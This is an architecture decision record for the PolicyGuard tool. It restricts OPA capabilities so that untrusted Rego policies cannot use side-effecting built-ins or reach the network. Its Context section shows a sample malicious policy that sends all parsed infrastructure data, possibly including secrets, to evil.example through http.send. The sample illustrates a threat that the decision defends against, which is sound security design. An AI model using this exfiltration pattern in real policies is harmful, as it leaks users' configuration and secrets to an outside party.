# 6. Restricting OPA capabilities to sandbox untrusted policies

- Status: Accepted
- Date: 2026-06

## Context

ADR-0001 makes policies external, user-supplied Rego loaded at runtime via
`--policy`. That is a feature — and an attack surface. Rego is not a pure
expression language: stock OPA ships **non-deterministic, side-effecting
built-ins**, most dangerously `http.send` (arbitrary outbound HTTP), plus
`net.lookup_ip_addr`, `opa.runtime`, `io.jwt.*`, `time.now_ns`, `rand.intn`,
`uuid.rfc4122`, and others.

PolicyGuard feeds parsed infrastructure — which can include hardcoded secrets
lifted from a `.tf` — into every policy as input. A malicious or compromised
policy could therefore do:

```rego
deny[msg] { http.send({"method": "POST", "url": "https://evil.example/x",
                        "body": input}) ; msg := "" }
```

and exfiltrate the entire parsed configuration to an attacker. A policy engine
that lets a loaded policy phone home fails its own threat model (operating
principle #4). The risk is real the moment a team scans with a third-party or
shared policy bundle.

## Options considered

1. **Trust the policy author.** Acceptable only if policies are always
   first-party — which contradicts the "drop a `.rego` in and extend the tool"
   value proposition.
2. **Pattern-scan policies for dangerous built-ins at load.** Brittle; a
   denylist of strings is trivially evaded and fights the language instead of the
   engine.
3. **Constrain the OPA capability set.** OPA's compiler and evaluator accept an
   `ast.Capabilities` describing which built-ins exist. Remove the dangerous ones
   and offending policies fail to *compile* — they are rejected at load, not
   merely blocked at run.

## Decision

Compile and evaluate with a **restricted capability set**
(`restrictedCapabilities()` in the engine): start from the default capabilities,
strip every built-in flagged non-deterministic (which covers `http.send`,
`net.lookup_ip_addr`, `opa.runtime`, `io.jwt.*`, `rand.intn`, `time.now_ns`,
`uuid.rfc4122`, …), and set `AllowNet` to an empty allow-list so no outbound
network access is permitted. The restriction is applied at **both** compile
(`WithCapabilities`) and eval (`rego.Capabilities`).

A policy that references a stripped built-in is rejected at load time with a
compile error, so the failure is loud and early rather than a silent data
exfiltration at scan time.

## Consequences

**Positive**

- A policy loaded from an untrusted `--policy` directory cannot exfiltrate the
  parsed infrastructure or reach the network.
- Removing non-deterministic built-ins also makes evaluation reproducible — the
  same input yields the same findings, which the deterministic-ordering and
  benchmark guarantees depend on.
- Because policies are also shipped **embedded in the signed binary**
  (`//go:embed`), the default policy set's integrity rides along with release
  signing (see the supply-chain section of `docs/SECURITY.md`).

**Negative / accepted costs**

- **Legitimate uses of those built-ins are gone.** A policy genuinely needing
  `time.now_ns` (e.g. "flag a certificate expiring within 30 days") cannot do it
  in-policy; that logic must move into the engine/input. We accept reduced policy
  expressiveness in exchange for a safe-by-default engine.
- The capability set is coupled to OPA's built-in catalog; an OPA upgrade that
  adds a new side-effecting built-in must be re-reviewed. The sandbox tests
  (`sandbox_test.go`) assert the dangerous ones stay rejected.
